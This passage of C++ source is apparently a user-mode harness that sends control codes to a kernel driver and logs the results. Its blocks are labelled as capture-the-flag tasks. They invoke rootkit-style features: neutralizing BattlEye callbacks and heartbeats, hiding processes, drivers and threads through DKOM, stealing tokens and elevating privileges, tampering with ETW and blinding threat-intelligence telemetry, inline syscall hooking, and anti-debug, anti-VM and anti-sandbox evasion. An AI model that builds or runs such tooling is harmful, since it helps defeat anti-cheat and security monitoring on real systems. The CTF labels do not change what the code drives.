                    struct { const char* name; DWORD flag; BehavSubSt* ss; } subs[] = {
                        { "Timing Resist", 0x01, &behavResp.TimingResist },
                        { "Pattern Break", 0x02, &behavResp.PatternBreak },
                        { "Anti-Sandbox",  0x04, &behavResp.AntiSandbox },
                        { "Telemetry Cut", 0x08, &behavResp.TelemetryCut },
                    };
                    for (auto& s : subs) {
                        if (!(g_behavFlags & s.flag)) continue;
                        Log("[+]   %s: %s (items=%u, runs=%u)\n",
                            s.name, s.ss->SuccessCount ? "OK" : "FAIL",
                            s.ss->ItemsProcessed, s.ss->RunCount);
                    }
                }
            } else {
                Log("[+] Skipped: Behavioral stealth (use --behav f to test)\n");
            }

            // ── CTF Task 57: Encrypted Pointer Handling ──
            #define _IOCTL_ENC_PTR CTL_CODE(FILE_DEVICE_UNKNOWN, 0x851, METHOD_BUFFERED, FILE_ANY_ACCESS)
            struct EncPtrSubSt { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct EncPtrResp {
                DWORD ActiveFeatures; DWORD TotalItems;
                EncPtrSubSt Detect; EncPtrSubSt Decrypt; EncPtrSubSt Static; EncPtrSubSt Runtime;
                DWORD PatternsFound; DWORD PointersDecrypted; DWORD StaticOffsets; DWORD RuntimeKeys;
            };
            if (g_encPtrFlags) {
                Log("[*] Enc pointer handling: applying features 0x%x\n", g_encPtrFlags);
                struct { DWORD Features; DWORD Flags; UINT64 TargetBase; UINT64 TargetSize; } epReq = { g_encPtrFlags, 0, 0, 0 };
                EncPtrResp epResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_ENC_PTR, &epReq, sizeof(epReq), &epResp, sizeof(epResp), &ret, nullptr);
                if (!ok) { Log("[!] Enc pointer: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] Enc pointer: active=0x%x total=%u\n", epResp.ActiveFeatures, epResp.TotalItems);
                    struct { const char* n; DWORD f; EncPtrSubSt* s; } ss[] = {
                        {"Detect",0x01,&epResp.Detect},{"Decrypt",0x02,&epResp.Decrypt},
                        {"Static",0x04,&epResp.Static},{"Runtime",0x08,&epResp.Runtime}};
                    for (auto& s : ss) { if (g_encPtrFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: Enc pointer (use --encptr f to test)\n"); }

            // ── CTF Task 58: BattlEye Improvements ──
            #define _IOCTL_BATTLEYE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x852, METHOD_BUFFERED, FILE_ANY_ACCESS)
            struct BeSubSt { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct BeResp {
                DWORD ActiveFeatures; DWORD TotalItems;
                BeSubSt CbNeutralize; BeSubSt ReportKill; BeSubSt HeartbeatKill; BeSubSt EarlyLoad; BeSubSt AntiDetect;
                DWORD CallbacksStripped; DWORD ReportsBlocked; DWORD HeartbeatsKilled; DWORD HooksPlaced; DWORD Pad;
            };
            if (g_battleyeFlags) {
                Log("[*] BattlEye harden: applying features 0x%x\n", g_battleyeFlags);
                struct { DWORD Features; DWORD Flags; UINT64 TargetPid; } beReq = { g_battleyeFlags, 0, 0 };
                BeResp beResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_BATTLEYE, &beReq, sizeof(beReq), &beResp, sizeof(beResp), &ret, nullptr);
                if (!ok) { Log("[!] BattlEye: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] BattlEye: active=0x%x total=%u\n", beResp.ActiveFeatures, beResp.TotalItems);
                    struct { const char* n; DWORD f; BeSubSt* s; } ss[] = {
                        {"CB Neutralize",0x01,&beResp.CbNeutralize},{"Report Kill",0x02,&beResp.ReportKill},
                        {"Heartbeat Kill",0x04,&beResp.HeartbeatKill},{"Early Load",0x08,&beResp.EarlyLoad},
                        {"Anti-Detect",0x10,&beResp.AntiDetect}};
                    for (auto& s : ss) { if (g_battleyeFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: BattlEye (use --battleye 1f to test)\n"); }

            // ── CTF Tasks 64-66: Kernel Stealth ──
            #define _IOCTL_KERN_STEALTH CTL_CODE(FILE_DEVICE_UNKNOWN, 0x853, METHOD_BUFFERED, FILE_ANY_ACCESS)
            struct KsSubSt { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct KsResp {
                DWORD ActiveFeatures; DWORD TotalItems;
                KsSubSt ProcHide; KsSubSt DrvHide; KsSubSt MemProtect; KsSubSt MemEncrypt; KsSubSt AntiEnum; KsSubSt AntiAnalysis;
                DWORD ProcessesHidden; DWORD DriversHidden; DWORD PagesProtected; DWORD RegionsEncrypted;
                DWORD EnumBlocked; DWORD AnalysisEvaded; DWORD Pad[2];
            };
            if (g_kstealthFlags) {
                Log("[*] Kernel stealth: applying features 0x%x\n", g_kstealthFlags);
                struct { DWORD Features; DWORD Flags; UINT64 TargetPid; } ksReq = { g_kstealthFlags, 0, 0 };
                KsResp ksResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_KERN_STEALTH, &ksReq, sizeof(ksReq), &ksResp, sizeof(ksResp), &ret, nullptr);
                if (!ok) { Log("[!] Kernel stealth: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] Kernel stealth: active=0x%x total=%u\n", ksResp.ActiveFeatures, ksResp.TotalItems);
                    struct { const char* n; DWORD f; KsSubSt* s; } ss[] = {
                        {"Proc Hide",0x01,&ksResp.ProcHide},{"Drv Hide",0x02,&ksResp.DrvHide},
                        {"Mem Protect",0x04,&ksResp.MemProtect},{"Mem Encrypt",0x08,&ksResp.MemEncrypt},
                        {"Anti-Enum",0x10,&ksResp.AntiEnum},{"Anti-Analysis",0x20,&ksResp.AntiAnalysis}};
                    for (auto& s : ss) { if (g_kstealthFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: Kernel stealth (use --kstealth 3f to test)\n"); }

            // ── CTF Task 67: DKOM Process Hiding ──
            #define _IOCTL_DKOM_PROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x854, METHOD_BUFFERED, FILE_ANY_ACCESS)
            struct DkProcSubSt { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct DkProcResp {
                DWORD ActiveFeatures; DWORD TotalItems;
                DkProcSubSt Hide; DkProcSubSt Restore; DkProcSubSt Token; DkProcSubSt Protection;
                DWORD ProcessesHidden; DWORD TokensStolen; DWORD ProtectionsSet; DWORD Pad;
            };
            if (g_dkomProcFlags) {
                Log("[*] [PG-UNSAFE] DKOM process hide: features 0x%x\n", g_dkomProcFlags);
                struct { DWORD Features; DWORD Flags; UINT64 TargetPid; } dpReq = { g_dkomProcFlags, 0, (UINT64)GetCurrentProcessId() };
                DkProcResp dpResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_DKOM_PROC, &dpReq, sizeof(dpReq), &dpResp, sizeof(dpResp), &ret, nullptr);
                if (!ok) { Log("[!] DKOM proc: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] DKOM proc: active=0x%x total=%u\n", dpResp.ActiveFeatures, dpResp.TotalItems);
                    struct { const char* n; DWORD f; DkProcSubSt* s; } ss[] = {
                        {"Hide",0x01,&dpResp.Hide},{"Restore",0x02,&dpResp.Restore},
                        {"Token",0x04,&dpResp.Token},{"Protect",0x08,&dpResp.Protection}};
                    for (auto& s : ss) { if (g_dkomProcFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: DKOM proc (use --dkom-proc f) [PG-UNSAFE]\n"); }

            // ── CTF Task 68: DKOM Driver Hiding ──
            #define _IOCTL_DKOM_DRV CTL_CODE(FILE_DEVICE_UNKNOWN, 0x855, METHOD_BUFFERED, FILE_ANY_ACCESS)
            struct DkDrvSubSt { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct DkDrvResp {
                DWORD ActiveFeatures; DWORD TotalItems;
                DkDrvSubSt Unlink; DkDrvSubSt Wipe; DkDrvSubSt Relink;
                DWORD DriversUnlinked; DWORD DriversWiped; DWORD DriversRelinked; DWORD Pad[2];
            };
            if (g_dkomDrvFlags) {
                Log("[*] [PG-UNSAFE] DKOM driver hide: features 0x%x\n", g_dkomDrvFlags);
                struct { DWORD Features; DWORD Flags; UINT64 TargetBase; } ddReq = { g_dkomDrvFlags, 0, 0 };
                DkDrvResp ddResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_DKOM_DRV, &ddReq, sizeof(ddReq), &ddResp, sizeof(ddResp), &ret, nullptr);
                if (!ok) { Log("[!] DKOM drv: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] DKOM drv: active=0x%x total=%u\n", ddResp.ActiveFeatures, ddResp.TotalItems);
                    struct { const char* n; DWORD f; DkDrvSubSt* s; } ss[] = {
                        {"Unlink",0x01,&ddResp.Unlink},{"Wipe",0x02,&ddResp.Wipe},{"Relink",0x04,&ddResp.Relink}};
                    for (auto& s : ss) { if (g_dkomDrvFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: DKOM drv (use --dkom-drv 7) [PG-UNSAFE]\n"); }

            // ── CTF Task 69: DKOM Thread Hiding ──
            #define _IOCTL_DKOM_THREAD CTL_CODE(FILE_DEVICE_UNKNOWN, 0x856, METHOD_BUFFERED, FILE_ANY_ACCESS)
            struct DkThrSubSt { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct DkThrResp {
                DWORD ActiveFeatures; DWORD TotalItems;
                DkThrSubSt Unlink; DkThrSubSt Cloak; DkThrSubSt Restore;
                DWORD ThreadsUnlinked; DWORD ThreadsCloaked; DWORD ThreadsRestored; DWORD Pad[2];
            };
            if (g_dkomThreadFlags) {
                Log("[*] [PG-UNSAFE] DKOM thread hide: features 0x%x\n", g_dkomThreadFlags);
                struct { DWORD Features; DWORD Flags; UINT64 TargetTid; } dtReq = { g_dkomThreadFlags, 0, 0 };
                DkThrResp dtResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_DKOM_THREAD, &dtReq, sizeof(dtReq), &dtResp, sizeof(dtResp), &ret, nullptr);
                if (!ok) { Log("[!] DKOM thread: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] DKOM thread: active=0x%x total=%u\n", dtResp.ActiveFeatures, dtResp.TotalItems);
                    struct { const char* n; DWORD f; DkThrSubSt* s; } ss[] = {
                        {"Unlink",0x01,&dtResp.Unlink},{"Cloak",0x02,&dtResp.Cloak},{"Restore",0x04,&dtResp.Restore}};
                    for (auto& s : ss) { if (g_dkomThreadFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: DKOM thread (use --dkom-thread 7) [PG-UNSAFE]\n"); }

            // ── CTF Tasks 70-74: DKOM EPROCESS Manipulation ──
            #define _IOCTL_DKOM_EPROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x857, METHOD_BUFFERED, FILE_ANY_ACCESS)
            struct DkEpSubSt { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct DkEpResp {
                DWORD ActiveFeatures; DWORD TotalItems;
                DkEpSubSt Hide; DkEpSubSt Elevate; DkEpSubSt Protect; DkEpSubSt EpUnlink; DkEpSubSt InlineHook; DkEpSubSt Combined;
                DWORD EpHidden; DWORD EpElevated; DWORD EpProtected; DWORD EpUnlinked; DWORD HooksPlaced; DWORD CombinedOps; DWORD Pad[2];
            };
            if (g_dkomEprocFlags) {
                Log("[*] [PG-UNSAFE] DKOM EPROCESS manip: features 0x%x\n", g_dkomEprocFlags);
                struct { DWORD Features; DWORD Flags; UINT64 TargetPid; } deReq = { g_dkomEprocFlags, 0, (UINT64)GetCurrentProcessId() };
                DkEpResp deResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_DKOM_EPROC, &deReq, sizeof(deReq), &deResp, sizeof(deResp), &ret, nullptr);
                if (!ok) { Log("[!] DKOM EPROCESS: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] DKOM EPROCESS: active=0x%x total=%u\n", deResp.ActiveFeatures, deResp.TotalItems);
                    struct { const char* n; DWORD f; DkEpSubSt* s; } ss[] = {
                        {"Hide",0x01,&deResp.Hide},{"Elevate",0x02,&deResp.Elevate},
                        {"Protect",0x04,&deResp.Protect},{"Unlink",0x08,&deResp.EpUnlink},
                        {"InlineHook",0x10,&deResp.InlineHook},{"Combined",0x20,&deResp.Combined}};
                    for (auto& s : ss) { if (g_dkomEprocFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: DKOM EPROCESS (use --dkom-eproc 3f) [PG-UNSAFE]\n"); }

            // ── CTF Task 75/79/81: Callback Neutralization ──
            #define _IOCTL_CB_NEUTRAL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x858, METHOD_BUFFERED, FILE_ANY_ACCESS)
            struct CbSub { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct CbResp { DWORD ActiveFeatures; DWORD TotalItems; CbSub Process; CbSub Thread; CbSub ImgLoad; CbSub Registry; CbSub Object; CbSub MiniFilter; DWORD CbNeutralized; DWORD CbRestored; DWORD Pad[2]; };
            if (g_cbNeutralFlags) {
                Log("[*] Callback neutralization: features 0x%x\n", g_cbNeutralFlags);
                struct { DWORD Features; DWORD Flags; UINT64 Reserved; } cbReq = { g_cbNeutralFlags, 0, 0 };
                CbResp cbResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_CB_NEUTRAL, &cbReq, sizeof(cbReq), &cbResp, sizeof(cbResp), &ret, nullptr);
                if (!ok) { Log("[!] CB neutral: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] CB neutral: active=0x%x total=%u neutralized=%u\n", cbResp.ActiveFeatures, cbResp.TotalItems, cbResp.CbNeutralized);
                    struct { const char* n; DWORD f; CbSub* s; } ss[] = {
                        {"Process",0x01,&cbResp.Process},{"Thread",0x02,&cbResp.Thread},{"ImgLoad",0x04,&cbResp.ImgLoad},
                        {"Registry",0x08,&cbResp.Registry},{"Object",0x10,&cbResp.Object},{"MiniFilter",0x20,&cbResp.MiniFilter}};
                    for (auto& s : ss) { if (g_cbNeutralFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: CB neutral (use --cb-neutral 3f)\n"); }

            // ── CTF Task 76: ETW Tampering ──
            #define _IOCTL_ETW_TAMP CTL_CODE(FILE_DEVICE_UNKNOWN, 0x859, METHOD_BUFFERED, FILE_ANY_ACCESS)
            struct EtwSub { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct EtwResp { DWORD ActiveFeatures; DWORD TotalItems; EtwSub PatchLogger; EtwSub KillProvider; EtwSub FilterEvent; EtwSub HookWrite; EtwSub BlindTI; DWORD LoggersPatched; DWORD ProvidersKilled; DWORD EventsFiltered; DWORD HooksPlaced; DWORD TIBlinded; DWORD Pad; };
            if (g_etwTampFlags) {
                Log("[*] ETW tampering: features 0x%x\n", g_etwTampFlags);
                struct { DWORD Features; DWORD Flags; UINT64 Reserved; } etReq = { g_etwTampFlags, 0, 0 };
                EtwResp etResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_ETW_TAMP, &etReq, sizeof(etReq), &etResp, sizeof(etResp), &ret, nullptr);
                if (!ok) { Log("[!] ETW tamp: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] ETW tamp: active=0x%x total=%u\n", etResp.ActiveFeatures, etResp.TotalItems);
                    struct { const char* n; DWORD f; EtwSub* s; } ss[] = {
                        {"PatchLogger",0x01,&etResp.PatchLogger},{"KillProvider",0x02,&etResp.KillProvider},
                        {"FilterEvent",0x04,&etResp.FilterEvent},{"HookWrite",0x08,&etResp.HookWrite},{"BlindTI",0x10,&etResp.BlindTI}};
                    for (auto& s : ss) { if (g_etwTampFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: ETW tamp (use --etw-tamp 1f)\n"); }

            // ── CTF Task 77/84: Advanced Behavioral Stealth ──
            #define _IOCTL_ADV_BEHAV CTL_CODE(FILE_DEVICE_UNKNOWN, 0x85A, METHOD_BUFFERED, FILE_ANY_ACCESS)
            struct AbSub { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct AbResp { DWORD ActiveFeatures; DWORD TotalItems; AbSub Timing; AbSub Pattern; AbSub AntiDbg; AbSub AntiVM; AbSub Sandbox; AbSub Monitor; DWORD TimingEvaded; DWORD PatternsRand; DWORD DbgEvaded; DWORD VMEvaded; DWORD SandboxEvaded; DWORD MonitorsBlocked; DWORD Pad[2]; };
            if (g_advBehavFlags2) {
                Log("[*] Adv behavioral stealth: features 0x%x\n", g_advBehavFlags2);
                struct { DWORD Features; DWORD Flags; UINT64 Reserved; } abReq = { g_advBehavFlags2, 0, 0 };
                AbResp abResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_ADV_BEHAV, &abReq, sizeof(abReq), &abResp, sizeof(abResp), &ret, nullptr);
                if (!ok) { Log("[!] Adv behav: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] Adv behav: active=0x%x total=%u\n", abResp.ActiveFeatures, abResp.TotalItems);
                    struct { const char* n; DWORD f; AbSub* s; } ss[] = {
                        {"Timing",0x01,&abResp.Timing},{"Pattern",0x02,&abResp.Pattern},{"AntiDbg",0x04,&abResp.AntiDbg},
                        {"AntiVM",0x08,&abResp.AntiVM},{"Sandbox",0x10,&abResp.Sandbox},{"Monitor",0x20,&abResp.Monitor}};
                    for (auto& s : ss) { if (g_advBehavFlags2 & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: Adv behav (use --adv-behav 3f)\n"); }

            // ── CTF Task 78/86: Inline Hooking ──
            #define _IOCTL_INLINE_HOOK2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x85B, METHOD_BUFFERED, FILE_ANY_ACCESS)
            struct IhSub { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct IhResp { DWORD ActiveFeatures; DWORD TotalItems; IhSub NtQuery; IhSub NtOpen; IhSub NtRead; IhSub NtWrite; IhSub RegistryHook; DWORD HooksPlaced; DWORD TrampolinesCreated; DWORD HooksRestored; DWORD Pad[2]; };
            if (g_inlineHookFlags) {
                Log("[*] Inline hooking: features 0x%x\n", g_inlineHookFlags);
                struct { DWORD Features; DWORD Flags; UINT64 Reserved; } ihReq = { g_inlineHookFlags, 0, 0 };
                IhResp ihResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_INLINE_HOOK2, &ihReq, sizeof(ihReq), &ihResp, sizeof(ihResp), &ret, nullptr);
                if (!ok) { Log("[!] Inline hook: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] Inline hook: active=0x%x total=%u hooks=%u tramps=%u\n", ihResp.ActiveFeatures, ihResp.TotalItems, ihResp.HooksPlaced, ihResp.TrampolinesCreated);
                    struct { const char* n; DWORD f; IhSub* s; } ss[] = {
                        {"NtQuery",0x01,&ihResp.NtQuery},{"NtOpen",0x02,&ihResp.NtOpen},{"NtRead",0x04,&ihResp.NtRead},
                        {"NtWrite",0x08,&ihResp.NtWrite},{"Registry",0x10,&ihResp.RegistryHook}};
                    for (auto& s : ss) { if (g_inlineHookFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: Inline hook (use --inline-hook 1f)\n"); }

            // ── CTF Task 82: Stealth Loading ──
            #define _IOCTL_STEALTH_LOAD CTL_CODE(FILE_DEVICE_UNKNOWN, 0x85C, METHOD_BUFFERED, FILE_ANY_ACCESS)
            struct SlSub { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct SlResp { DWORD ActiveFeatures; DWORD TotalItems; SlSub Artifact; SlSub AntiDbg; SlSub Delay; SlSub EarlyProt; DWORD ArtifactsRemoved; DWORD DbgChecks; DWORD DelaysApplied; DWORD EarlyProts; DWORD Pad[2]; };
            if (g_stealthLoadFlags) {
                Log("[*] Stealth loading: features 0x%x\n", g_stealthLoadFlags);
                struct { DWORD Features; DWORD Flags; UINT64 Reserved; } slReq = { g_stealthLoadFlags, 0, 0 };
                SlResp slResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_STEALTH_LOAD, &slReq, sizeof(slReq), &slResp, sizeof(slResp), &ret, nullptr);
                if (!ok) { Log("[!] Stealth load: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] Stealth load: active=0x%x total=%u\n", slResp.ActiveFeatures, slResp.TotalItems);
                    struct { const char* n; DWORD f; SlSub* s; } ss[] = {
                        {"Artifact",0x01,&slResp.Artifact},{"AntiDbg",0x02,&slResp.AntiDbg},{"Delay",0x04,&slResp.Delay},{"EarlyProt",0x08,&slResp.EarlyProt}};
                    for (auto& s : ss) { if (g_stealthLoadFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: Stealth load (use --stealth-load f)\n"); }

            // ── CTF Task 83: Memory Protection ──
            #define _IOCTL_MEM_PROT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x85D, METHOD_BUFFERED, FILE_ANY_ACCESS)
            struct MpSub { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct MpResp { DWORD ActiveFeatures; DWORD TotalItems; MpSub Encrypt; MpSub PageGuard; MpSub Footprint; MpSub AntiSig; DWORD RegionsEncrypted; DWORD PagesProtected; DWORD FootprintReduced; DWORD SigsRandomized; DWORD Pad[2]; };
            if (g_memProtFlags) {
                Log("[*] Memory protection: features 0x%x\n", g_memProtFlags);
                struct { DWORD Features; DWORD Flags; UINT64 Reserved; } mpReq = { g_memProtFlags, 0, 0 };
                MpResp mpResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_MEM_PROT, &mpReq, sizeof(mpReq), &mpResp, sizeof(mpResp), &ret, nullptr);
                if (!ok) { Log("[!] Mem prot: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] Mem prot: active=0x%x total=%u\n", mpResp.ActiveFeatures, mpResp.TotalItems);
                    struct { const char* n; DWORD f; MpSub* s; } ss[] = {
                        {"Encrypt",0x01,&mpResp.Encrypt},{"PageGuard",0x02,&mpResp.PageGuard},{"Footprint",0x04,&mpResp.Footprint},{"AntiSig",0x08,&mpResp.AntiSig}};
                    for (auto& s : ss) { if (g_memProtFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: Mem prot (use --mem-prot f)\n"); }

            // ── CTF Task 85: DKOM Restoration ──
            #define _IOCTL_DKOM_RESTORE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x85E, METHOD_BUFFERED, FILE_ANY_ACCESS)
            struct DrSub { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct DrResp { DWORD ActiveFeatures; DWORD TotalItems; DrSub ProcRestore; DrSub DrvRestore; DrSub ThreadRestore; DrSub Verify; DWORD ProcsRestored; DWORD DrvsRestored; DWORD ThreadsRestored; DWORD VerifyPassed; DWORD Pad[2]; };
            if (g_dkomRestoreFlags) {
                Log("[*] DKOM restoration: features 0x%x\n", g_dkomRestoreFlags);
                struct { DWORD Features; DWORD Flags; UINT64 Reserved; } drReq = { g_dkomRestoreFlags, 0, 0 };
                DrResp drResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_DKOM_RESTORE, &drReq, sizeof(drReq), &drResp, sizeof(drResp), &ret, nullptr);
                if (!ok) { Log("[!] DKOM restore: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] DKOM restore: active=0x%x total=%u\n", drResp.ActiveFeatures, drResp.TotalItems);
                    struct { const char* n; DWORD f; DrSub* s; } ss[] = {
                        {"ProcRestore",0x01,&drResp.ProcRestore},{"DrvRestore",0x02,&drResp.DrvRestore},
                        {"ThreadRestore",0x04,&drResp.ThreadRestore},{"Verify",0x08,&drResp.Verify}};
                    for (auto& s : ss) { if (g_dkomRestoreFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: DKOM restore (use --dkom-restore f)\n"); }

            // ── CTF Task 87: Syscall Interception ──
            #define _IOCTL_SYSCALL_INT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x85F, METHOD_BUFFERED, FILE_ANY_ACCESS)
            struct SiSub { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct SiResp { DWORD ActiveFeatures; DWORD TotalItems; SiSub Inline; SiSub Callback; SiSub Dkom; SiSub Compare; DWORD InlineHooks; DWORD CbManips; DWORD DkomOps; DWORD Comparisons; DWORD Pad[2]; };
            if (g_syscallIntFlags) {
                Log("[*] Syscall interception: features 0x%x\n", g_syscallIntFlags);
                struct { DWORD Features; DWORD Flags; UINT64 Reserved; } siReq = { g_syscallIntFlags, 0, 0 };
                SiResp siResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_SYSCALL_INT, &siReq, sizeof(siReq), &siResp, sizeof(siResp), &ret, nullptr);
                if (!ok) { Log("[!] Syscall int: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] Syscall int: active=0x%x total=%u\n", siResp.ActiveFeatures, siResp.TotalItems);
                    struct { const char* n; DWORD f; SiSub* s; } ss[] = {
                        {"Inline",0x01,&siResp.Inline},{"Callback",0x02,&siResp.Callback},{"DKOM",0x04,&siResp.Dkom},{"Compare",0x08,&siResp.Compare}};
                    for (auto& s : ss) { if (g_syscallIntFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: Syscall int (use --syscall-int f)\n"); }

            // ── CTF Task 80: Kernel Hiding Framework ──
            #define _IOCTL_KERN_HIDE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x860, METHOD_BUFFERED, FILE_ANY_ACCESS)
            struct KhSub { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; DWORD LastResult; };
            struct KhResp { DWORD ActiveFeatures; DWORD TotalItems; KhSub ProcHide; KhSub DrvHide; KhSub ThreadHide; KhSub Unified; KhSub RestoreAll; DWORD ProcsHidden; DWORD DrvsHidden; DWORD ThreadsHidden; DWORD UnifiedOps; DWORD Restored; DWORD Pad; };
            if (g_kernHideFlags) {
                Log("[*] Kernel hide framework: features 0x%x\n", g_kernHideFlags);
                struct { DWORD Features; DWORD Flags; UINT64 TargetPid; } khReq = { g_kernHideFlags, 0, (UINT64)GetCurrentProcessId() };
                KhResp khResp = {0};
                BOOL ok = DeviceIoControl(hBetest, _IOCTL_KERN_HIDE, &khReq, sizeof(khReq), &khResp, sizeof(khResp), &ret, nullptr);
                if (!ok) { Log("[!] Kern hide: failed (err=%u)\n", (unsigned)GetLastError()); }
                else {
                    Log("[+] Kern hide: active=0x%x total=%u\n", khResp.ActiveFeatures, khResp.TotalItems);
                    struct { const char* n; DWORD f; KhSub* s; } ss[] = {
                        {"ProcHide",0x01,&khResp.ProcHide},{"DrvHide",0x02,&khResp.DrvHide},{"ThreadHide",0x04,&khResp.ThreadHide},
                        {"Unified",0x08,&khResp.Unified},{"RestoreAll",0x10,&khResp.RestoreAll}};
                    for (auto& s : ss) { if (g_kernHideFlags & s.f) Log("[+]   %s: %s (items=%u)\n", s.n, s.s->SuccessCount?"OK":"FAIL", s.s->ItemsProcessed); }
                }
            } else { Log("[+] Skipped: Kern hide (use --kern-hide 1f)\n"); }

